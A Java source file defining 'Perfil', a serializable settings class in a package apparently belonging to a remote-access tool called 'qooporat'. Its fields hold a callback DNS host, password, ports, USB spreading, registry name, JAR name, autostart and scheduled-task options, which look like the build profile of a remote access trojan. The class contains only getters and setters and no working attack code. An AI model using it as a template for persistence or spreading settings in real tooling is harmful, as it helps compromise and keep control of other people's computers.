package qooporat.android.utilidades;
/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

import java.io.Serializable;
/**
 *
 * @author alberto
 */
public class Perfil implements Serializable {
    private String nombre;
    private String prefijo;
    private String claveClase;
    private String dns;
    private String password;
    private String puerto1;
    private String puerto2;
    private String delay;
    private boolean usb;
    private String nombreUSB;
    private boolean instalar;
    private String regName;
    private String jarName;
    private boolean autoInicio;
    private boolean progTareas;
    private String nombreArchivo;
    public Perfil() {
    }
    public Perfil(String nombre, String prefijo, String claveClase, String dns, String password, String puerto1, String puerto2, String delay, boolean usb, String nombreUSB, boolean instalar, String regName, String jarName, boolean autoInicio, boolean progTareas) {
        this.nombre = nombre;
        this.prefijo = prefijo;
        this.claveClase = claveClase;
        this.dns = dns;
        this.password = password;
        this.puerto1 = puerto1;
        this.puerto2 = puerto2;
        this.delay = delay;
        this.usb = usb;
        this.nombreUSB = nombreUSB;
        this.instalar = instalar;
        this.regName = regName;
        this.jarName = jarName;
        this.autoInicio = autoInicio;
        this.progTareas = progTareas;
    }
    public Perfil(String nombre, String prefijo, String claveClase, String dns, String password, String puerto1, String puerto2, String delay, boolean usb, String nombreUSB, boolean instalar, String regName, String jarName, boolean autoInicio, boolean progTareas, String nombreArchivo) {
        this.nombre = nombre;
        this.prefijo = prefijo;
        this.claveClase = claveClase;
        this.dns = dns;
        this.password = password;
        this.puerto1 = puerto1;
        this.puerto2 = puerto2;
        this.delay = delay;
        this.usb = usb;
        this.nombreUSB = nombreUSB;
        this.instalar = instalar;
        this.regName = regName;
        this.jarName = jarName;
        this.autoInicio = autoInicio;
        this.progTareas = progTareas;
        this.nombreArchivo = nombreArchivo;
    }
    public String getNombre() {
        return nombre;
    }
    public void setNombre(String nombre) {
        this.nombre = nombre;
    }
    public String getPrefijo() {
        return prefijo;
    }
    public void setPrefijo(String prefijo) {
        this.prefijo = prefijo;
    }
    public String getClaveClase() {
        return claveClase;
    }
    public void setClaveClase(String claveClase) {
        this.claveClase = claveClase;
    }
    public String getDns() {
        return dns;
    }
    public void setDns(String dns) {
        this.dns = dns;
    }
    public String getPassword() {
        return password;
    }
    public void setPassword(String password) {
        this.password = password;
    }
    public String getPuerto1() {
        return puerto1;
    }
    public void setPuerto1(String puerto1) {
        this.puerto1 = puerto1;
    }
    public String getPuerto2() {
        return puerto2;
    }
    public void setPuerto2(String puerto2) {
        this.puerto2 = puerto2;
    }
    public String getDelay() {
        return delay;
    }
    public void setDelay(String delay) {
        this.delay = delay;
    }
    public boolean isUsb() {
        return usb;
    }
    public void setUsb(boolean usb) {
        this.usb = usb;
    }
    public String getNombreUSB() {
        return nombreUSB;
    }
    public void setNombreUSB(String nombreUSB) {
        this.nombreUSB = nombreUSB;
    }
    public boolean isInstalar() {
        return instalar;
    }
    public void setInstalar(boolean instalar) {
        this.instalar = instalar;
    }
    public String getRegName() {
        return regName;
    }
    public void setRegName(String regName) {
        this.regName = regName;
    }
    public String getJarName() {
        return jarName;
    }
    public void setJarName(String jarName) {
        this.jarName = jarName;
    }
    public boolean isAutoInicio() {
        return autoInicio;
    }
    public void setAutoInicio(boolean autoInicio) {
        this.autoInicio = autoInicio;
    }
    public boolean isProgTareas() {
        return progTareas;
    }
    public void setProgTareas(boolean progTareas) {
        this.progTareas = progTareas;
    }
    @Override
    public String toString() {
        return "Perfil{" + "nombre=" + nombre + ", prefijo=" + prefijo + ", claveClase=" + claveClase + ", dns=" + dns + ", password=" + password + ", puerto1=" + puerto1 + ", puerto2=" + puerto2 + ", delay=" + delay + ", usb=" + usb + ", nombreUSB=" + nombreUSB + ", instalar=" + instalar + ", regName=" + regName + ", jarName=" + jarName + ", autoInicio=" + autoInicio + ", progTareas=" + progTareas + '}';
    }
    public String getNombreArchivo() {
        return nombreArchivo;
    }
    public void setNombreArchivo(String nombreArchivo) {
        this.nombreArchivo = nombreArchivo;
    }
}
